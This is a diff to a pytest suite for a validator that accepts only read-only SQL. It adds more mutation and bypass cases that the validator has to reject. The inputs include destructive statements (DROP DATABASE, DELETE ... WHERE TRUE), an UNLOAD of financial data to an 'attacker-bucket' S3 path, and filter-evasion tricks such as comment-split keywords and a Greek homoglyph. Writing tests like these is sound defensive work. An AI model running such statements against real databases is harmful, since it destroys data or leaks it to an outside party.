@@ -85,16 +85,21 @@ class TestQueryValidation:
         [
             # DML
             "INSERT INTO users VALUES (1, 'test')",
+            'INSERT /*+ arbitrary hint */ INTO "weird--table" ("select", "update") SELECT * FROM prod_src.metrics',
             "UPDATE users SET name = 'test' WHERE id = 1",
             'DELETE FROM users WHERE id = 1',
+            'DELETE FROM iceberg_db.transactions WHERE TRUE',
             'MERGE INTO prod.dim_customer t USING staging.cust s ON (t.id=s.id) WHEN MATCHED THEN UPDATE SET name=s.name WHEN NOT MATCHED THEN INSERT (id,name) VALUES (s.id,s.name)',
             'TRUNCATE TABLE users',
             # DDL
             'CREATE TABLE test (id INT)',
             "CREATE TABLE IF NOT EXISTS tmp.ctas_test WITH (format='PARQUET') AS SELECT * FROM prod.sales LIMIT 10",
+            'CREATE OR REPLACE VIEW secure_view AS SELECT * FROM sensitive.table',
             'DROP TABLE users',
+            'DROP TABLE IF EXISTS archive.old_data',
             'ALTER TABLE users ADD COLUMN email VARCHAR(100)',
             'ALTER TABLE prod.important RENAME TO prod.important_old',
+            "ALTER TABLE ice_db.orders ADD IF NOT EXISTS PARTITION (dt = '2025-06-24') LOCATION 's3://bucket/orders/2025/06/24/'",
             'CREATE DATABASE test_db',
             'DROP DATABASE test_db',
             # DML with UNION
@@ -102,16 +107,29 @@ class TestQueryValidation:
             # CTE
             'SELECT * FROM (WITH hack AS (INSERT INTO users VALUES (1)) SELECT * FROM hack)',
             'SELECT * FROM (WITH hack AS (DELETE FROM users) SELECT 1)',
+            'WITH staging AS (SELECT * FROM sampledb.elb_logs) INSERT INTO prod.logs SELECT * FROM staging',
+            'WITH cte AS (SELECT * FROM users) INSERT INTO log SELECT * FROM cte',
             # DCL
             'GRANT SELECT ON users TO role1',
             # Configuration changes
             'SET hive.exec.dynamic.partition = true',
+            'SET SESSION query_max_run_time = 60s',
+            'SET SESSION hive.exec.dynamic.partition.mode = nonstrict',
             'USE database_name',
             # TCL
             'COMMIT',
             'ROLLBACK',
             # Data export/import
             "UNLOAD ( SELECT * FROM prod.financials LIMIT 100 ) TO 's3://attacker-bucket/loot/' WITH (format='PARQUET')",
+            # Modern Trino/Iceberg commands
+            "CALL iceberg.system.rewrite_data_files(table => 'iceberg_db.large_tbl')",
+            'OPTIMIZE my_catalog.my_schema.my_tbl',
+            'OPTIMIZE iceberg_db.fact_sales REWRITE DATA',
+            'VACUUM iceberg_db.fact_sales',
+            'MSCK REPAIR TABLE sampledb.newlogs',
+            # EXPLAIN with mutations
+            "EXPLAIN INSERT INTO users VALUES (1, 'test')",
+            "EXPLAIN ANALYZE INSERT INTO users VALUES (1, 'test')",
         ],
     )
     def test_non_read_only_queries_are_invalid(self, query):
@@ -131,32 +149,16 @@ class TestQueryValidation:
             'SELECT * FROM',  # Incomplete query
             'SELEC * FROM users',  # Typo
             'SELECT * FROM users WHERE',  # Incomplete WHERE
+            "WITH noop AS (SELECT 1), _x AS ( CALL system$set_session('foo','bar') ) SELECT * FROM noop",
             'IN/*hidden*/SERT INTO prod.audit(id) VALUES (1)',
             'ΙNSERT INTO prod.tricky VALUES (1)',  # Unicode homoglyph: Greek Ι (iota) looks like Latin I
+            'EXPLAIN (TYPE IO) INSERT INTO analytics.hits SELECT * FROM raw.hits WHERE year = 2025',
         ],
     )
     def test_invalid_sql_syntax(self, query):
         """Test that invalid SQL syntax is caught."""
         with pytest.raises(ValueError, match='SQL parse error'):
             validate_query(query)
-
-    def test_with_clause_handling(self):
-        """Test that WITH clauses are properly handled."""
-        # Should allow WITH clauses that wrap SELECT
-        validate_query('WITH cte AS (SELECT * FROM users) SELECT * FROM cte')
-
-        # Should block WITH clauses that wrap mutations
-        with pytest.raises(ValueError, match='not permitted'):
-            validate_query('WITH cte AS (SELECT * FROM users) INSERT INTO log SELECT * FROM cte')
-
-    def test_explain_analyze_handling(self):
-        """Test that EXPLAIN ANALYZE validates inner statements."""
-        # Should allow EXPLAIN ANALYZE with SELECT
-        validate_query('EXPLAIN ANALYZE SELECT * FROM users')
-
-        # Should block EXPLAIN ANALYZE with mutations
-        with pytest.raises(ValueError, match='not permitted'):
-            validate_query("EXPLAIN ANALYZE INSERT INTO users VALUES (1, 'test')")
 
     @pytest.mark.parametrize(
         'query',
